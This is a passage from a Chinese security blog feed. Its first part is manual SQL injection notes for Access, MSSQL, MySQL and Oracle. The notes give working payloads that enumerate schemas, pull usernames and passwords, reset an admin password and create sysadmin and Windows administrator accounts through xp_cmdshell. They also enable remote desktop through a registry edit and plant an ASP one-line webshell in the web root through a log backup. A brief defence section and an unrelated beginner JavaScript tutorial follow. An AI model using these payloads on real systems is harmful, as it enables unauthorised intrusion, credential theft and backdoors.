<h3><span id="判断数据库类型">判断数据库类型</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from 数据库独有表名)&gt;0</span><br><span class="line">count:统计数据库表个数</span><br></pre></td></tr></table></figure>
<p>附加:</p>
<table>
<thead>
<tr>
<th>数据库</th>
<th style="text-align:left">数据库独有表名</th>
</tr>
</thead>
<tbody>
<tr>
<td>access</td>
<td style="text-align:left">mssysobjects</td>
</tr>
<tr>
<td>mssql</td>
<td style="text-align:left">sysbojects</td>
</tr>
<tr>
<td>mysql</td>
<td style="text-align:left">infomation_schema.tables</td>
</tr>
<tr>
<td>oracle</td>
<td style="text-align:left">sys.user_tables</td>
</tr>
</tbody>
</table>
<h3><span id="判断表名">判断表名</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from admin) &gt;0</span><br><span class="line"></span><br><span class="line">返回正常 说明admin表存在</span><br><span class="line">返回错误 说明admin表不存在</span><br></pre></td></tr></table></figure>
<h3><span id="判断列名">判断列名</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and (select count(admin_user) from admin) &gt;0</span><br><span class="line"></span><br><span class="line">将*换成你需要猜的列名即可</span><br><span class="line">返回正常 说明admin表存在列admin_user</span><br><span class="line">返回错误 说明admin表不存在列admin_user</span><br></pre></td></tr></table></figure>
<h3><span id="判断字段长度">判断字段长度</span></h3><p>判断长度函数：len(admin_user) </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and (select len(admin_user) from admin)&gt;4   返回正常</span><br><span class="line">and (select len(admin_user) from admin)&lt;5	返回错误</span><br><span class="line"></span><br><span class="line">说明当前密码长度为5</span><br></pre></td></tr></table></figure>
<h3><span id="判断值">判断值</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">left(admin_user,1)=&apos;a&apos;  判断左边起一个字符是否为a</span><br><span class="line"></span><br><span class="line">and (select left(admin_user,1) from admin)=&apos;a&apos;</span><br><span class="line">and (select left(admin_user,2) from admin)=&apos;ad&apos; 左边起前两个是否为ad</span><br></pre></td></tr></table></figure>
<h2><span id="手工注入mssql">手工注入MSSQL</span></h2><h3><span id="判断注入点">判断注入点</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=1;    返回正常</span><br><span class="line">and 1=2;	返回错误</span><br><span class="line">and @@version&gt;0   判断版本</span><br></pre></td></tr></table></figure>
<h3><span id="查看当前连接数据库的用户名">查看当前连接数据库的用户名</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and user&gt;0</span><br><span class="line">返回：</span><br><span class="line">dbo=sa mssql管理员</span><br><span class="line">端口 1433</span><br></pre></td></tr></table></figure>
<h3><span id="查看当前连接数据库">查看当前连接数据库</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and db_name()&gt;0</span><br></pre></td></tr></table></figure>
<h3><span id="查看其他数据库">查看其他数据库</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)&lt;&gt;0</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">sysdatabases里面存储的是一些系统信息，包括所有数据库的名字。</span><br><span class="line">Dbid就是数据库的id，dbid的值从1到5被系统占用，所以其他数据库是从6开始的</span><br><span class="line">将name与1比较，类型转换错误也就爆出了数据库的名字。将dbid的值从6开始试下去，就得到了所有的库名</span><br></pre></td></tr></table></figure>
<h3><span id="判断表名">判断表名</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysbojects where xtype=&apos;u&apos; and status&gt;0)&gt;0</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">sysbojects是SQLServer的系统表，存储着所有的表名、视图、约束及其他对象，</span><br><span class="line">其中&quot;xtype=&apos;u&apos; and status&gt;0&quot;表示用户建立的表名</span><br><span class="line">上面的语句将第一个表名取出，与0比较大小，让错误信息把表名报出来</span><br></pre></td></tr></table></figure>
<h3><span id="判断其他表">判断其他表</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysbojects where xtype=&apos;u&apos; and status&gt;0 and name not in (&apos;已猜出表&apos;))&gt;0</span><br></pre></td></tr></table></figure>
<h3><span id="判断列名">判断列名</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">第一字段为&quot;ID&quot;，用object_id(表名)能获取表名对应的内部ID。</span><br><span class="line">col_name(表名ID，1)代表该表的第1个字段名，将1换乘2，3，4...</span><br><span class="line">就可以逐个获取所猜解表里面的所有字段名</span><br></pre></td></tr></table></figure>
<h3><span id="判断值">判断值</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select username from admin)&gt;0</span><br><span class="line">and (select password from admin)&gt;0</span><br></pre></td></tr></table></figure>
<h3><span id="更改密码">更改密码</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;update 库名.abo.admin表 set password=&apos;a123456&apos; where username=&apos;admin&apos;;--</span><br><span class="line">--: 注释符</span><br></pre></td></tr></table></figure>
<h2><span id="mssql注入高级操作">mssql注入高级操作</span></h2><h3><span id="建立数据库用户">建立数据库用户</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addlogin user,pass;--</span><br></pre></td></tr></table></figure>
<h3><span id="数据库提权">数据库提权</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addsrvrolemember user,sysadmin;--</span><br></pre></td></tr></table></figure>
<h3><span id="打开3389">打开3389</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hklm\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t reg_dword /d &quot;0&quot; /f</span><br></pre></td></tr></table></figure>
<h3><span id="建立系统用户">建立系统用户</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &quot;net user username password /add&quot;--</span><br><span class="line">;exec master..xp_cmdshell &quot;net localgroup administrators username /add&quot;--</span><br></pre></td></tr></table></figure>
<h3><span id="读系统写文件">读系统写文件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.利用查询分析器连接数据库</span><br><span class="line">2.create table vvboot (line varchar(8000))  创建表</span><br><span class="line">3.bulk insert vvboot from &apos;c:\boot.ini&apos;     导入c:\boot.ini内容进tables</span><br><span class="line">4.select * from vvboot 			    读取tables内容</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;echo aaa&gt;&gt;c:u.txt&apos;--  写入aa到c:u.txt &gt;&gt;追加</span><br></pre></td></tr></table></figure>
<h3><span id="备份拿一句话木马">备份拿一句话木马</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute request(&quot;value&quot;)%&gt;</span><br><span class="line">&lt;%eval request(&quot;1&quot;)%&gt;</span><br><span class="line">URL编码：%3C%25execute+request%28%22value%22%29%25%3E </span><br><span class="line">十六进制：0x3C25657865637574652072657175657374282276616C75652229253E</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">；alter database article set RECOVERY FULL--   把恢复改为完全模式</span><br><span class="line">；create table　　alog (a image)--       建立一个表</span><br><span class="line">；backup alog article to disk=&apos;c:\cmd&apos; with init--     减少备份大小</span><br><span class="line">;insert into alog (a) values(&apos;&lt;%execute request(&quot;value&quot;)%&gt;&apos;)--     插入一句话木马</span><br><span class="line">;backup log article to disk=&apos;C:\darticle3.4\darticle3.4\a.asp&apos;--      备份日志</span><br></pre></td></tr></table></figure>
<h3><span id="注入防范">注入防范</span></h3><p>安全编码，参数化查询<br>WAF<br>防注入的脚本:<br>过滤关键字:and select update or union post get cookie<br>在有漏洞脚本调用防注入的脚本：</p>
<pre><code>&lt;!--#Include File=&quot;防注入脚本.asp&quot;--&gt;
</code></pre><h2><span id="手工注入mysql">手工注入MySQL</span></h2><h3><span id="数据库的管理工具">数据库的管理工具</span></h3><pre><code>phpmyadmin
    默认user:root
    默认pass:php168.com
</code></pre><h3><span id="phpini">php.ini</span></h3><pre><code>magic_quotes_gpc=on
</code></pre><p>对于GET/POST/Cookie提交的数据中的单引号、双引号、反斜线和空字节进行转义<br>也就是在这个字符前面加上反斜线，提交的“’”会变成“\”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;=%2527  绕过限制</span><br><span class="line">char(90) </span><br><span class="line">left(boardname,2)=char(97,104)</span><br></pre></td></tr></table></figure>
<h3><span id="uion联合查询">uion联合查询</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table1,table2 from db1</span><br></pre></td></tr></table></figure>
<p>条件：</p>
<ul>
<li>前后表的列数要相同<pre><code>判断前表查询列数
union select 1 返回正常 表明前表为一列
union select 1,2,3,4,5 返回正常 表明前表为五列
union select null,null,null,null,null 
</code></pre> oracle:<pre><code>union select null,null,null,null,null from dual (oracle默认表名)
</code></pre></li>
<li>前后表对应列的数据类型要兼容<pre><code>判断前表哪列是字符
union select &apos;1&apos;,2,3,4,5   返回正常 说明第一列为字符
</code></pre></li>
<li>如果前表出错，将返回后表的结果<pre><code>id=-1 union select user()
id=-1 union select database()
</code></pre></li>
</ul>
<p>###　判断注入点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 返回正常</span><br><span class="line">and 1=2 返回错误</span><br></pre></td></tr></table></figure>
<h3><span id="判断用户名">判断用户名</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select user()   联合查询</span><br><span class="line">union select current_user() 当前用户</span><br><span class="line">union select system_user() 系统用户</span><br><span class="line">id=-1 union select session_user()  连接数据库的用户</span><br></pre></td></tr></table></figure>
<h3><span id="判断版本号">判断版本号</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select version()</span><br></pre></td></tr></table></figure>
<h3><span id="判断当前连接数据库">判断当前连接数据库</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select database()</span><br></pre></td></tr></table></figure>
<h3><span id="判断表名">判断表名</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select table from ddbname</span><br></pre></td></tr></table></figure>
<h3><span id="判断值">判断值</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select username from dbname</span><br></pre></td></tr></table></figure>
<h3><span id="读文件load_file">读文件(load_file())</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select load_file(&apos;c:\boot.ini&apos;)</span><br><span class="line">将文件名 c:\boot.ini 转换为十六进制 绕过“\”转义</span><br></pre></td></tr></table></figure>
<h2><span id="手工注入oracle">手工注入Oracle</span></h2><h3><span id="猜字段数">猜字段数</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1union select null , null from dual</span><br><span class="line">id=-1union select null, null , null from dual</span><br><span class="line">id=-1 union select null,null,null,null,null,null,null,null,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure>
<h3><span id="猜哪个字段为字符串">猜哪个字段为字符串</span></h3><p>猜哪个字段是字符串型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select &apos;1&apos;,null,null,null,null,null,null,null,null,null,null,null,null from dual   第九个</span><br></pre></td></tr></table></figure></p>
<h3><span id="猜用户">猜用户</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,user,null,null,null,null from user_tables  </span><br><span class="line"> 将用户代入字符串字段</span><br></pre></td></tr></table></figure>
<h3><span id="查看版本信息">查看版本信息</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,banner,null,null,null,null from v$version  </span><br><span class="line"> 将banner代入字符串字段</span><br></pre></td></tr></table></figure>
<h3><span id="看库名">看库名</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,name,null,null,null,null from v$database    </span><br><span class="line"> 将库名代入字符串字段</span><br></pre></td></tr></table></figure>
<h3><span id="看表数">看表数</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,count(*)||&apos;&apos;,null,null,null,null from user_tables  </span><br><span class="line"> 将count(*)||&apos;&apos; 函数 代入字符串字段</span><br></pre></td></tr></table></figure>
<h3><span id="看第一个表名">看第一个表名</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,table_name,null,null,null,null from (select rownum aa,table_name from user_tables) where aa=1</span><br></pre></td></tr></table></figure>
<h3><span id="查看表的记录数">查看表的记录数</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,count(*)||&apos;&apos;,null,null,null,null from USERINFO</span><br></pre></td></tr></table></figure>
<h3><span id="查看第一条记录">查看第一条记录</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,USER_ACCOUNT,null,null,null,null from(select rownum aa,USER_ACCOUNT from USERINFO)where aa=1</span><br></pre></td></tr></table></figure>
<h3><span id="查看密码">查看密码</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,PASSWORD,null,null,null,null from(select rownum aa,PASSWORD from USERINFO)where aa=1</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[智能社：JavaScript教程-从入门到精通视频-整理笔记]]></title>
      <url>https://uknowsec.cn/posts/notes/%E6%99%BA%E8%83%BD%E7%A4%BE%EF%BC%9AJavaScript%E6%95%99%E7%A8%8B-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E8%A7%86%E9%A2%91%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vaBq86vyU_oNsNHGme3T1HWSdJ6vvn6X5xAgtgVzRWvEAQAA_wAAAEpQ.jpg" alt="javascript"></p>
<h1><span id="初探javascript魅力-1">初探JavaScript魅力-1</span></h1><h2><span id="javascript是什么">JavaScript是什么</span></h2><p>根据用户的一些操作，然后来修改页面上的一些元素、属性等。</p>
<p>（1）HTML+CSS静态页面，JS给页面添加动的效果</p>
<p>（2）网页特效的原理</p>
<p>javascript就是修改样式</p>
<p>（3）编写JS的流程：</p>
<p>【1】布局：HTML+CSS</p>
<p>【2】属性：确定要修改哪些属性</p>
<p>【3】事件：确定用户做哪些操作</p>
<p>【4】编写JS：在事件中，用JS来修改页面元素的样式</p>
<p>补：事件：就是用户操作，如鼠标点击、移入、移出等</p>
<p>（4）id：在css中，id作为css里的一个选择符存在，而在JS里它有更加广泛的用途，</p>
<p>   在JS中扮演标签(元素)名字的作用，如<div id="div1">……</div>，id在这个例子里扮演了div名字的作用，div1就是div的名字</p>
<p>（5）div1.style.display=’block’</p>
<p>点 .      ——&gt; 的，一般来说是所属的关系，其实是属性</p>
<p>等号 = ——&gt; 在数学里，x=5，表示x的值就是5，即等号就是相等的意思</p>
<p> 在JS里，等号并不是相等的意思，等号指赋值，把什么变成什么，把=右边的值赋给左边</p>
<h2><span id="第一个js兼容性问题documentgetelementbyid">第一个JS兼容性问题:document.getElementById</span></h2><p>（1）在FF和低版本的chrome下，是不能直接拿着id就用的，存在兼容问题</p>
<p>真正兼容的写法是document.getElementById(‘id名字’)，在任何浏览器下均可用</p>
<p>如：document.getElementById(‘div1’);</p>
<p>   通过div1这个id把元素获取出来，然后再来用</p>
<p>注：记住，不能直接拿着id就用，而必须的通过getElementById（把元素获取出来）获取一下，然后才可以用 </p>
<p>（2）网页换肤</p>
<p>(1) 任何标签都可以加ID，包括link</p>
<p>(2) 任何标签的任何属性，也都可以修改</p>
<p>(3) HTML里怎么写，JS里就怎么写，只有一个例外就是class，因为class在JS里是关键字（保留字），所以不能直接拿来用，要写成className</p>
<h2><span id="引入函数因为直接在事件内写代码会很乱">引入函数：因为直接在事件内写代码会很乱</span></h2><p>（1）函数基本格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[javascript] view plain copy</span><br><span class="line"></span><br><span class="line">    function 函数名()  </span><br><span class="line">    &#123;  </span><br><span class="line">            代码  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p> JS里的函数和css里的class有点相似，像class它最大的一个功能就是你把这个样式写到class里边，然后只要需要这套样式的地方，直接把那个class拿过去用就</p>
<p> 可以了，同样JS里的函数也一样.</p>
<p>（2）函数的定义和调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[javascript] view plain copy</span><br><span class="line"></span><br><span class="line">    function show()        //定义  </span><br><span class="line">    &#123;  </span><br><span class="line">        alert(&apos;abc&apos;);  </span><br><span class="line">    &#125;  </span><br><span class="line">    show();               //调用</span><br></pre></td></tr></table></figure>
<p>函数定义：只是告诉系统有这个函数，不会实际执行</p>
<p>函数调用：真正执行函数里的代码</p>
<p>注：函数的定义和调用缺一不可，只有定义则没反应，只有调用则显示出错了</p>
<p>（3）引入变量的概念：考虑到重用</p>
<p>变量：就是给东西取了个别名</p>
<p>如var oDiv=document.getElementById(‘div1’);给后面这大串取了个别名叫oDiv。看到oDiv就跟看到document.getElementById(‘div1’)是一样的效果</p>
<p>注：(1) 如果你要操作一个元素，你必须先把它选择过来，比如现在要操作的是text这个元素，那么需要先给它加个id，比如id=”txt1”,然后function函数里用</p>
<p> getElementById把它给选择过来</p>
<p>(2) 要操作谁，就要获取谁  </p>
<p>(3) 需要一个函数，这个函数是为按钮准备的，因为它点击需要一个函数</p>
<h2><span id="if判断如点击按钮显示隐藏div弹出菜单">if判断：如点击按钮显示/隐藏div(弹出菜单)</span></h2><p>（1）if判断基本格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[javascript] view plain copy</span><br><span class="line"></span><br><span class="line">    if(条件)  </span><br><span class="line">    &#123;  </span><br><span class="line">    语句1  </span><br><span class="line">    &#125;  </span><br><span class="line">    else  </span><br><span class="line">    &#123;  </span><br><span class="line">    语句2  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>翻译：如果条件成立就执行语句1，如果条件不成立就执行语句2</p>
<p>  注：<br> (1) if ：如果<br> (2) 条件：在IS里是判断的意思，就是遇到不同的情况就做不同的操作，遇到不同的问题就做不同的处理</p>
<p>（2）单等和双等(=和==)</p>
<p>=    赋值（改变，变成）</p>
<p>==   判断（判断两边是否相等）</p>
<p>（3）为a链接添加JS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!--&lt;a href=&quot;javascript:alert(&apos;a&apos;);&quot;&gt;链接&lt;/a&gt; --&gt;     </span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;javascript:;&quot;&gt;链接&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>一般a里不加JS代码，而是空的js原因：(1) 在a里加js代码不好 (2) 加空的js代码而不是加##，因为它不会像##那样一点就跳到页首。</p>
<h1><span id="初探javascript魅力-2">初探JavaScript魅力-2</span></h1><h2><span id="函数传参">函数传参</span></h2><h3><span id="改变背景颜色">改变背景颜色</span></h3><p>(1)参数传参：参数就是占位符（占住一个位置，以便于后续向里面塞东西）<br>    什么时候用传参–函数里定不下来的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function setColor(color)</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv.style.background=color;</span><br><span class="line">&#125;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;变黑&quot; onclick=&quot;setColor(&apos;black&apos;);&quot; /&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>上例定义函数setColor，它有一个参数为color,从input中传递一个参数为black，才是color这个参数就为black,从而实现函数参数的传递。</p>
<h3><span id="改变div的任意样式">改变Div的任意样式</span></h3><p>(1)操纵属性的两种方式<br>   将属性名作为参数传递</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> 1.</span><br><span class="line"> </span><br><span class="line"> function setStyle(name, value)</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	//第一种操作属性的方法  特点:[]里面为一个字符串，可以用变量代替</span><br><span class="line">	oDiv.style[&apos;name&apos;]=value;</span><br><span class="line">	//第二种操作属性的方法  特点：方便</span><br><span class="line">	oDiv.style.name.=value;</span><br><span class="line">&#125;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;变绿&quot; onclick=&quot;setStyle(&apos;background&apos;, &apos;green&apos;)&quot; /&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="style与classname">style与className</span></h3><p> (1)元素.style.属性=xxx是修改行间样式</p>
<p>样式优先级：*&lt;标签&lt;class&lt;ID&lt;行间</p>
<p>如下代码 已给出style的属性再修改className就不会有效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;无标题文档&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">##div1 &#123;width:200px; height:200px; border:1px solid black;&#125;</span><br><span class="line">.box &#123;background:red;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function toRed()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv.className=&apos;box&apos;;</span><br><span class="line">&#125;</span><br><span class="line">function toGreen()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv.style.background=&apos;green&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;变红&quot; onclick=&quot;toRed()&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;变绿&quot; onclick=&quot;toGreen()&quot; /&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>注意：<br>1.若已给出style的属性再修改className就不会有效果<br>2.对于同一个元素，要么选择操纵class要么操纵style</p>
<h2><span id="提取行间事件">提取行间事件</span></h2><h3><span id="为元素添加事件">为元素添加事件</span></h3><p>(1)事件和其他属性一样，可以用JS添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function 名字()</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">oBtn.onclick=名字   //直接获取onclick属性</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">oBtn.onclick=function ()    //匿名函数</span><br><span class="line">&#123;</span><br><span class="line">	....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
